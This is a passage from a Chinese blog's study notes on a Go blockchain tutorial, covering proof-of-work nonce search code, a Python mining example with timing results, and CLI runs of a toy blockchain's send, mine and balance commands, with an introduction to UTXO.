<span class="comment">// Lsh函数就是向左移位，移的越多目标难度值越大，</span></span><br><span class="line">	<span class="comment">// 哈希取值落在的空间就更多, 就越容易找到符合条件的nonce。</span></span><br><span class="line">	target.Lsh(target, <span class="type">uint</span>(<span class="number">256</span>-constcoe.Difficulty))</span><br><span class="line">	<span class="keyword">return</span> target.Bytes()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 每次我们输入一个nonce对应的区块的哈希值都会改变</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> GetBase4Nonce(nonce <span class="type">int64</span>) []<span class="type">byte</span> &#123;</span><br><span class="line">	data := bytes.Join([][]<span class="type">byte</span>&#123;</span><br><span class="line">		utils.ToHexInt(b.Timestamp),</span><br><span class="line">		b.PrevHash,</span><br><span class="line">		utils.ToHexInt(<span class="type">int64</span>(nonce)),</span><br><span class="line">		b.Target,</span><br><span class="line">		b.Data,</span><br><span class="line">	&#125;, []<span class="type">byte</span>&#123;&#125;,</span><br><span class="line">	)</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> FindNonce() <span class="type">int64</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> intHash big.Int</span><br><span class="line">	<span class="keyword">var</span> intTarget big.Int</span><br><span class="line">	<span class="keyword">var</span> hash [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">	<span class="keyword">var</span> nonce <span class="type">int64</span></span><br><span class="line">	nonce = <span class="number">0</span></span><br><span class="line">	intTarget.SetBytes(b.Target)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> nonce &lt; math.MaxInt64 &#123;</span><br><span class="line">		fmt.Printf(<span class="string">&quot;=======================\n&quot;</span>)</span><br><span class="line">		fmt.Println(<span class="string">&quot;Start Find the Right Nonce&quot;</span>)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;nonce: %d\n&quot;</span>, nonce)</span><br><span class="line">		data := b.GetBase4Nonce(nonce)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;data: %x\n&quot;</span>, data)</span><br><span class="line">		hash = sha256.Sum256(data)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;hash: %x\n&quot;</span>, hash)</span><br><span class="line">		intHash.SetBytes(hash[:])</span><br><span class="line">		fmt.Printf(<span class="string">&quot;intHash: %x\n&quot;</span>, &amp;intHash)</span><br><span class="line">		fmt.Printf(<span class="string">&quot;intTarget: %x\n&quot;</span>, &amp;intTarget)</span><br><span class="line">		<span class="comment">// Cmp compares x and y and returns:</span></span><br><span class="line">		<span class="comment">//   -1 if x &lt;  y</span></span><br><span class="line">		<span class="comment">//    0 if x == y</span></span><br><span class="line">		<span class="comment">//   +1 if x &gt;  y</span></span><br><span class="line">		<span class="keyword">if</span> intHash.Cmp(&amp;intTarget) == <span class="number">-1</span> &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// 每次失败nonce就加1</span></span><br><span class="line">			<span class="comment">// 直到由当前nonce得到的区块哈希转化为数值 小于 目标难度值为止。</span></span><br><span class="line">			nonce++</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> nonce</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *Block)</span></span> ValidatePow() <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> intHash big.Int</span><br><span class="line">	<span class="keyword">var</span> intTarget big.Int</span><br><span class="line">	<span class="keyword">var</span> hash [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">	intTarget.SetBytes(b.Target)</span><br><span class="line">	data := b.GetBase4Nonce(b.Nonce) <span class="comment">// 由当前nonce得到的区块哈希</span></span><br><span class="line">	hash = sha256.Sum256(data)</span><br><span class="line">	intHash.SetBytes(hash[:])</span><br><span class="line">	<span class="keyword">if</span> intHash.Cmp(&amp;intTarget) == <span class="number">-1</span> &#123; <span class="comment">// 区块哈希转化为数值小于目标难度值</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="测试不同难度值">测试不同难度值:</h2>
<p>尝试将全局变量<code>Difficulty</code>改大来增加难度值，然后观察一下各个区块的<code>nonce</code>、<code>timestamp</code>的变化。</p>
<p>Difficulty = 12</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">符合条件 intHash &lt; intTarget：</span><br><span class="line"></span><br><span class="line">Start Find the Right Nonce</span><br><span class="line">nonce: 3483</span><br><span class="line"><span class="built_in">hash</span>:      000dc411eb3f27a11d820658c7a465357aaa92ff662448b8cd0ae561829877ac</span><br><span class="line">intHash:   dc411eb3f27a11d820658c7a465357aaa92ff662448b8cd0ae561829877ac</span><br><span class="line">intTarget: 10000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">不符条件 intHash &gt; intTarget：</span><br><span class="line"></span><br><span class="line">Start Find the Right Nonce</span><br><span class="line">nonce: 3482</span><br><span class="line"><span class="built_in">hash</span>:      86916242d284f85cd3355af5b81a704f6e52b9fb69271ab5d5ff78fab894ce66</span><br><span class="line">intHash:   86916242d284f85cd3355af5b81a704f6e52b9fb69271ab5d5ff78fab894ce66</span><br><span class="line">intTarget: 10000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<p>Difficulty = 15</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">符合条件 intHash &lt; intTarget：</span><br><span class="line"></span><br><span class="line">Start Find the Right Nonce</span><br><span class="line">nonce: 33547</span><br><span class="line"><span class="built_in">hash</span>:      00017e89620ddef6de217ed066611b7aad51668c15f1df021cb51d4a2b9832d0</span><br><span class="line">intHash:   17e89620ddef6de217ed066611b7aad51668c15f1df021cb51d4a2b9832d0</span><br><span class="line">intTarget: 2000000000000000000000000000000000000000000000000000000000000</span><br><span class="line"></span><br><span class="line">不符条件 intHash &gt; intTarget：</span><br><span class="line"></span><br><span class="line">Start Find the Right Nonce</span><br><span class="line">nonce: 33546</span><br><span class="line"><span class="built_in">hash</span>:      4fd58060f8f54d4b9e98bab58f449b26f7297bc278ae946fce9ec0a15e4aa0cb</span><br><span class="line">intHash:   4fd58060f8f54d4b9e98bab58f449b26f7297bc278ae946fce9ec0a15e4aa0cb</span><br><span class="line">intTarget: 2000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<p>统计结果如下：难度值越高，<code>intTarget</code>长度越短，找出符合条件的<code>nonce</code>的尝试次数越多。</p>
<table>
<thead>
<tr>
<th>难度值</th>
<th>Hash ByteLength</th>
<th>intTarget值</th>
<th>intTarget ByteLength</th>
<th>尝试次数</th>
</tr>
</thead>
<tbody>
<tr>
<td>12</td>
<td>64</td>
<td>10000000000000000000000000000000000000000000000000000000000000</td>
<td>62</td>
<td>3483</td>
</tr>
<tr>
<td>15</td>
<td>64</td>
<td>2000000000000000000000000000000000000000000000000000000000000</td>
<td>61</td>
<td>33547</td>
</tr>
<tr>
<td>30</td>
<td>64</td>
<td>400000000000000000000000000000000000000000000000000000000</td>
<td>57</td>
<td>未测</td>
</tr>
</tbody>
</table>
<h1>参考一：简化的工作量证明算法</h1>
<p>参考一下<a href="https://github.com/tianmingyun/MasterBitcoin2CN/blob/master/ch10.md">《MasteringBitcoin》</a>里的简化的工作量证明算法。</p>
<p>挖矿的目标是找到一个随机数的值<code>nonce</code>，使区块头的哈希值小于难度目标<code>target</code>。<br />
在找到合适的随机值前，挖矿节点可能需要尝试数十亿，或数万亿次。</p>
<p>简单地说，挖矿是重复散列区块头的过程，不断更改参数，直到生成的哈希值与特定目标相匹配。<br />
散列函数的结果不能预先确定，也不能创建产生特定哈希值的模式。<br />
散列函数的这种特性意味着产生匹配特定目标的散列结果的唯一方法是反复尝试，随机修改输入，直到偶然出现所需的结果。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># Proof-of-Work 算法示例</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    long        <span class="comment"># Python 2</span></span><br><span class="line">    xrange</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    long = <span class="built_in">int</span>  <span class="comment"># Python 3</span></span><br><span class="line">    xrange = <span class="built_in">range</span></span><br><span class="line"></span><br><span class="line">max_nonce = <span class="number">2</span> ** <span class="number">32</span>  <span class="comment"># 40亿</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">header, difficulty_bits</span>):</span><br><span class="line">    <span class="comment"># 计算难度目标</span></span><br><span class="line">    target = <span class="number">2</span> ** (<span class="number">256</span> - difficulty_bits)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> nonce <span class="keyword">in</span> xrange(max_nonce):</span><br><span class="line">        hash_result = hashlib.sha256(<span class="built_in">str</span>(header) + <span class="built_in">str</span>(nonce)).hexdigest()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查是否是目标值以下的有效结果</span></span><br><span class="line">        <span class="keyword">if</span> long(hash_result, <span class="number">16</span>) &lt; target:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Success with nonce %d&quot;</span> % nonce)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hash is %s&quot;</span> % hash_result)</span><br><span class="line">            <span class="keyword">return</span> (hash_result, nonce)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed after %d (max_nonce) tries&quot;</span> % nonce)</span><br><span class="line">    <span class="keyword">return</span> nonce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    nonce = <span class="number">0</span></span><br><span class="line">    hash_result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 难度从0到31位</span></span><br><span class="line">    <span class="keyword">for</span> difficulty_bits <span class="keyword">in</span> xrange(<span class="number">32</span>):</span><br><span class="line">        difficulty = <span class="number">2</span> ** difficulty_bits</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Difficulty: %ld (%d bits)&quot;</span> % (difficulty, difficulty_bits))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Starting search...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 当前时间</span></span><br><span class="line">        start_time = time.time()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建一个包含前一个块的散列的新块</span></span><br><span class="line">        <span class="comment"># 我们伪造一个交易块 —— 只是一个字符串。</span></span><br><span class="line">        new_block = <span class="string">&#x27;test block with transactions&#x27;</span> + hash_result</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 为新块找到一个有效的nonce</span></span><br><span class="line">        (hash_result, nonce) = proof_of_work(new_block, difficulty_bits)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录需要多长时间才能找到结果</span></span><br><span class="line">        end_time = time.time()</span><br><span class="line"></span><br><span class="line">        elapsed_time = end_time - start_time</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Elapsed Time: %.4f seconds&quot;</span> % elapsed_time)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> elapsed_time &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 估计每秒的散列计算次数</span></span><br><span class="line">            hash_power = <span class="built_in">float</span>(long(nonce) / elapsed_time)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Hashing Power: %ld hashes per second&quot;</span> % hash_power)</span><br></pre></td></tr></table></figure>
<p>nonce自增,会不断去计算出符合条件的hash值，类似暴力破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hash_result is 1f3fe9dcf01e80b10e2adb650ac8fa0d843566b67f1109e9db6017bbde6d6651</span><br><span class="line">hash_result is 5fdceb40e2c82558588a67c55f2c074f68a5e5d9d18db20aef6adc930f4220ce</span><br><span class="line">hash_result is c59e7922f6e6701898c4392fa1ac5bc351bb0c16dae0d8793beab5bac9de688c</span><br><span class="line">hash_result is a7717e95f3d912771573ca305aabaa983081642edb1f55fc55d30eae1e2edfac</span><br><span class="line">hash_result is efafc1b283dc674b288c7afcfa58cb36927e067f7bc23f5c4de361531ecd55ee</span><br><span class="line">hash_result is b7663a2c3e43f68478670fb7e60fec7330c6c457f648b03bf4bb451f21a4e8db</span><br><span class="line">hash_result is 014bbc2e4bc516ab57543a053f0e320021410e6f2e1791ca01bebd914f3bfecf</span><br><span class="line">hash_result is 6dd4ab421f060e6f4b968964e7d2ea85825c2138e73719f574a7edc00b705078</span><br><span class="line">hash_result is 7cadff34a0d0fc0a5fd0e12eaed399be025d90eae75968bc67c19b6e70a34697</span><br></pre></td></tr></table></figure>
<p>长度的判断条件则是将hash值前面的0去掉。换言之，难度目标影响了 符合条件的hash值的前置零的个数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检查是否是目标值以下的有效结果</span></span><br><span class="line"><span class="keyword">if</span> long(hash_result, <span class="number">16</span>) &lt; target:</span><br><span class="line"><span class="comment"># 示例:     00000006dc70d218bafb37c31f3166e49b1b0d28f3fea500431ecb22e954c99e </span></span><br><span class="line"><span class="comment">#           =》</span></span><br><span class="line"><span class="comment">#          6dc70d218bafb37c31f3166e49b1b0d28f3fea500431ecb22e954c99e</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line">============================</span><br><span class="line">Difficulty: 2097152 (21 bits)</span><br><span class="line">Starting search...</span><br><span class="line">Success with nonce 687438</span><br><span class="line">Hash is   000003a6eeee97491a9183e4c57458172edb6f9466377bf44afbd74e410f6eef</span><br><span class="line">target is 55213970774324510299478046898216203619608871777363092441300193790394368</span><br><span class="line">Elapsed Time: 1.3613 seconds</span><br><span class="line">Hashing Power: 504976 hashes per second</span><br><span class="line">============================</span><br><span class="line">Difficulty: 4194304 (22 bits)</span><br><span class="line">Starting search...</span><br><span class="line">Success with nonce 1759164</span><br><span class="line">Hash is   0000008bb8f0e731f0496b8e530da984e85fb3cd2bd81882fe8ba3610b6cefc3</span><br><span class="line">target is 27606985387162255149739023449108101809804435888681546220650096895197184</span><br><span class="line">Elapsed Time: 3.5224 seconds</span><br><span class="line">Hashing Power: 499417 hashes per second</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">Difficulty: 268435456 (28 bits)</span><br><span class="line">Starting search...</span><br><span class="line">Success with nonce 139905000</span><br><span class="line">Hash is   0000000e4da88b53f70b2c5fc142500f0633e6407a4793462c54e6e704a687f3</span><br><span class="line">target is 431359146674410236714672241392314090778194310760649159697657763987456</span><br><span class="line">Elapsed Time: 289.7721 seconds</span><br><span class="line">Hashing Power: 482810 hashes per second</span><br></pre></td></tr></table></figure>
<p>从输出结果来看，难度越大，<code>target</code>越短，符合条件的hash值的前置零的个数 需要得越多</p>
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>正确hash的前置0个数</th>
<th>耗费时间</th>
</tr>
</thead>
<tbody>
<tr>
<td>21</td>
<td>5</td>
<td>1.3613 seconds</td>
</tr>
<tr>
<td>22</td>
<td>6</td>
<td>3.5224 seconds</td>
</tr>
<tr>
<td>28</td>
<td>7</td>
<td>289.7721 seconds</td>
</tr>
</tbody>
</table>
<p>继续看书中的例子：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Difficulty: 67108864 (26 bits)</span><br><span class="line">Starting search...</span><br><span class="line">Success with nonce 84561291</span><br><span class="line">Hash is 0000001f0ea21e676b6dde5ad429b9d131a9f2b000802ab2f169cbca22b1e21a</span><br><span class="line">Elapsed Time: 665.0949 seconds</span><br><span class="line">Hashing Power: 127141 hashes per second</span><br></pre></td></tr></table></figure>
<p>可以看出，随着难度位一位一位地增加，查找正确结果的时间会加倍增长。<br />
如果考虑整个256bit数字空间，每次要求多一个0，就把哈希查找空间缩减了一半。<br />
在什么的输出中，为寻找一个随机数使得哈希值开头的26位值为0，一共尝试了8千多万次。<br />
即使笔记本电脑每秒可以达120,000多次哈希计算，找到结果依然需要10分钟。</p>
<p>在写这本书的时候，比特币网络要寻找区块头信息哈希值小于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000029AB9000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>
<p>可以看出，这个难度目标开头的0多了很多。这意味着可接受的哈希值范围大幅缩减，因而找到正确的哈希值更加困难。<br />
网络平均每秒要花费超过1.8个zeta次哈希（千亿个哈希）才能发现下一个区块。<br />
这似乎是一项不可能完成的任务，但幸运的是，网络每秒有3exa次哈希（EH/sec）的处理能力，平均10分钟左右就能找到一个区块。</p>
<h1>参考二:</h1>
<h2 id="何谓工作量证明">何谓工作量证明:</h2>
<p>网路上的节点可以简单地透过工作量证明，快速验证彼此是否拥有记帐权。就像是我们求学时期所发的毕业证书，大学四年熬夜苦读、凿壁偷光就是为了获得那张毕业证书，求职时，面试官透过那张毕业证书，快速验证你大学的成果。<br />
上述例子中，你的毕业证书就是你的「工作量证明」。</p>
<h2 id="以比特币为例介绍PoW">以比特币为例介绍PoW:</h2>
<p>每10~15分钟比特币网路上全体矿工会互相竞争，运用大量的运算能力去解一道复杂的数学题的答案，这个答案是一个<code>随机数</code>，可以想像题目大概长这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hash｛（前一个区块的Hash 值）,（当前区块的交易资讯）,（随机数）｝＝当前区块的Hash 值</span><br></pre></td></tr></table></figure>
<p>矿工必须找出一串数字，代入上述公式，让当前区块的Hash 值开头为18 个0 ，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000001583447dd74c13c09280a9218827244089adadaba8c8c9</span><br></pre></td></tr></table></figure>
<p>解答的过程没有轨迹可循，矿工只能不断代入<code>随机数</code>，透过暴力的解法找出答案。</p>
<h2 id="挖矿难度">挖矿难度:</h2>
<p>最先解开的人就能获得下一个区块的记帐权并获得比特币作为奖励。<br />
比特币固定10~15 分钟出块一次，但是如果节点越来越多、全网算力增加，会缩短算出答案的时间。<br />
因此，比特币协议每2016 个区块会调整一次挖矿难度，大约两个礼拜调整一次。<br />
挖矿难度提高时，就必须找出有更多个0 的当前区块Hash 值，例如从原先的18 个0 增加到19 个0，难度降低时则相反。</p>
<h2 id="算力低的矿机没机会得到记帐权？">算力低的矿机没机会得到记帐权？</h2>
<p>必须强调的是，挖矿的过程其实像是掷一颗20 面的骰子，谁先骰到&lt; 2 的数字谁就能获得计帐权.<br />
换句话说，矿机的硬体运算能力再强大，也只能提高获得计帐权的机率（骰骰子手速比较快），算力差的矿工不代表没有机会。</p>
<p>很多人都认为，如果以后超级电脑普及，工作量证明不就没用了吗？<br />
其实工作量证明数学题的难度相当高，因此取得记帐权的机会就像抽奖一样，即便某人拥有超级电脑，也只能够提高机率。<br />
这就像在湖里丢一枚硬币，让一万个人去找这枚硬币，就算你是奥运游泳选手，也未必能第一个找到这枚硬币，只能提高找到的机率。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.krad.top/goblockchain02/">Go Blockchain Tutorial Part 2: Proof of Work</a></p>
</li>
<li class="lvl-2">
<p><a href="https://know.zombit.info/pow/">工作量證明 PoW (Proof of Work)－算力挖礦</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/tianmingyun/MasterBitcoin2CN/blob/master/ch10.md">《MasteringBitcoin》</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/xitu/gold-miner/blob/master/TODO/proof-of-work-vs-proof-of-stake.md">工作量证明 vs 权益证明：基本挖矿指南</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>BlockChain</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-GoBlockchain_Tutorial_Part4_Read_Store_and_Manage</title>
    <url>/2022/8887.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p><a href="https://www.krad.top/goblockchain04/">Go Blockchain Tutorial Part 4: Read,Store and Manage</a> 学习记录</p>
<h1>交易信息池：</h1>
<p>我们知道区块链中每个区块可以存放复数个交易信息，而不是每生成一个交易信息就创建一个区块加入区块链。</p>
<p>对于一个区块链节点而言，它会将自己生成的交易信息与从其它节点收集的交易信息存储于一个<code>交易信息池Transaction Pool</code>中。<br />
当存储的交易信息数量达到一阈值或者等待时间超过一阈值就会将交易池中的交易信息打包为候选区块参与PoW共识机制，这一过程称为<code>挖矿mine</code>，是节点争取将自己的候选区块加入到区块链中的过程。</p>
<h1>系统调试:</h1>
<p>现在我们先创建一个区块链，这个区块链的创建者是你自己。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main createblockchain -address Jerry</span><br><span class="line">Genesis Created</span><br><span class="line">Finished creating blockchain, and the owner is:  Jerry</span><br></pre></td></tr></table></figure>
<p>然后我们可以使用balance命令查询你自己的余额，并使用blockchaininfo命令打印区块链。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main balance -address Jerry</span><br><span class="line">Address:Jerry, Balance:1000 </span><br><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main blockchaininfo</span><br><span class="line">--------------------------------------------------------------------------------------------------------------</span><br><span class="line">Timestamp:1659666065</span><br><span class="line">Previous <span class="built_in">hash</span>:4a657272792069732066617421</span><br><span class="line">Transactions:[0xc0055cc050]</span><br><span class="line"><span class="built_in">hash</span>:fe809dd8173e5309e260a9196c9ebbffae383f7f128dd05b405e725a126911d0</span><br><span class="line">Pow: <span class="literal">true</span></span><br><span class="line">--------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>测试一下send命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main send -from Jerry -to Tom -amount 100</span><br><span class="line">Success!</span><br><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main balance -address Jerry</span><br><span class="line">Address:Jerry, Balance:1000 </span><br><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main balance -address Tom</span><br><span class="line">Address:Tom, Balance:0 </span><br></pre></td></tr></table></figure>
<p>由Jerry转账100给Tom这个交易信息创建成功，但是我们查询Jerry的余额发现没有变动，这是因为成功创建的交易信息还保存在交易信息池中，没有被添加进区块链里。我们需要使用<code>mine</code>命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main mine</span><br><span class="line">Finish Mining</span><br><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main balance -address Jerry</span><br><span class="line">Address:Jerry, Balance:100 </span><br><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main balance -address Tom</span><br><span class="line">Address:Tom, Balance:100 </span><br></pre></td></tr></table></figure>
<blockquote>
<p>??? 余额不对,待会Debug</p>
</blockquote>
<p>此时打印区块链会得到两个区块。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MacBook-Pro:my-blockchain chanjerry$ ./main blockchaininfo</span><br><span class="line">--------------------------------------------------------------------------------------------------------------</span><br><span class="line">Timestamp:1659666447</span><br><span class="line">Previous <span class="built_in">hash</span>:fe809dd8173e5309e260a9196c9ebbffae383f7f128dd05b405e725a126911d0</span><br><span class="line">Transactions:[0xc00007a1e0]</span><br><span class="line"><span class="built_in">hash</span>:acc3f1de20d319ebf008eb975b6ec427338e2e036f9c0083e2b9c602192a61d9</span><br><span class="line">Pow: <span class="literal">true</span></span><br><span class="line">--------------------------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------</span><br><span class="line">Timestamp:1659666065</span><br><span class="line">Previous <span class="built_in">hash</span>:4a657272792069732066617421</span><br><span class="line">Transactions:[0xc00007a230]</span><br><span class="line"><span class="built_in">hash</span>:fe809dd8173e5309e260a9196c9ebbffae383f7f128dd05b405e725a126911d0</span><br><span class="line">Pow: <span class="literal">true</span></span><br><span class="line">--------------------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>为了更加方便测试，我们可以创建一个脚本文件</p>
<figure class="highlight bash"><figcaption><span>mac脚本</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Hello World !&quot;</span></span><br><span class="line"><span class="comment"># 删除tmp目录</span></span><br><span class="line"><span class="comment"># avoid删除错东西，先手动删除就好</span></span><br><span class="line">./main createblockchain -address Jerry</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;==blockchaininfo===&quot;</span></span><br><span class="line">./main blockchaininfo</span><br><span class="line">./main balance -address Jerry</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;==send -from Jerry -to Tom -amount 100==&quot;</span></span><br><span class="line">./main send -from Jerry -to Tom -amount 100</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;==mine===&quot;</span></span><br><span class="line">./main mine</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;==balance -address Tom===&quot;</span></span><br><span class="line">./main balance -address Tom</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;==blockchaininfo===&quot;</span></span><br><span class="line">./main blockchaininfo</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;==balance -address Jerry===&quot;</span></span><br><span class="line">./main balance -address Jerry</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line">./main balance -address Tom</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line">./main send -from Jerry -to Gia -amount 100</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line">./main send -from Tom -to Gia -amount 30</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line">./main mine</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line"><span class="comment">#./main blockchaininfo</span></span><br><span class="line">./main balance -address Jerry</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line">./main balance -address Tom</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br><span class="line">./main balance -address Gia</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;=====================================&quot;</span></span><br></pre></td></tr></table></figure>
<h1>理解UTXO:</h1>
<h2 id="什么是UTXO">什么是UTXO?</h2>
<blockquote>
<p>在比特币社区内，有一种这样的说法：<strong>其实并没有比特币，有的只是UTXO</strong>。还有一种说法是：<strong>如果理解了UTXO，你就理解了比特币。</strong></p>
</blockquote>
<p>全称为 <code>Unspent Transaction output</code><br />
UTXO is all those outputs that are yet to be unlocked by an input.<br />
<strong>UTXO 是所有尚未被输入解锁的输出.</strong><br />
<strong>UTXO 代表未被使用的交易输出:</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p>它是某人在执行交易后剩余的数字货币数量。</p>
</li>
<li class="lvl-2">
<p>交易完成后，未使用的<code>输出</code>将作为<code>输入</code>存回数据库，稍后可用于另一笔交易。</p>
</li>
</ul>
<h2 id="UTXO是如何创建的？">UTXO是如何创建的？</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>UTXO</code> 是通过使用现有的 UTXO 创建的.<code>输入</code>消耗一个现有的<code>UTXO</code>,而<code>输出</code>创建一个新的 <code>UTXO</code>。</p>
</li>
<li class="lvl-2">
<p>每笔比特币交易都由<code>输入</code>和<code>输</code>出组成</p>
</li>
</ul>
<p>例如直接看一笔bitcoin的<a href="https://www.blockchain.com/btc/tx/0627052b6f28912f2703066a912ea577f2ce4da4caa5a5fbd8a57286c345c2f2">真实交易记录</a>，可以看到交易的<code>输入</code>和<code>输出</code>部分：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220810110030.png" alt="20220810110030" /></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>交易Tx</code>形成了一条链，最近交易的<code>输入</code>对应以前交易的<code>输出</code></p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220810110220.png" alt="交易链中一笔交易输出就是另一笔交易的输入" /><br />
